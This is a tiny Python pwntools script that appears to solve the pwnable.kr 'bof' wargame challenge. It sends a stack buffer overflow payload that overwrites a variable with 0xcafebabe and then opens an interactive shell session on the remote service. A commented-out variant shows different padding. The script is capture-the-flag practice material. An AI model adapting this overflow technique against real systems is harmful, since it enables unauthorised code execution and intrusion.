from pwn import *

payload = "A"*52+"\xbe"+"\xba"+"\xfe"+"\xca"
# payload = "A"*36+"\xca\xfe\xba\xbe"
r = remote('pwnable.kr', 9000)
r.sendline(payload)
r.interactive()
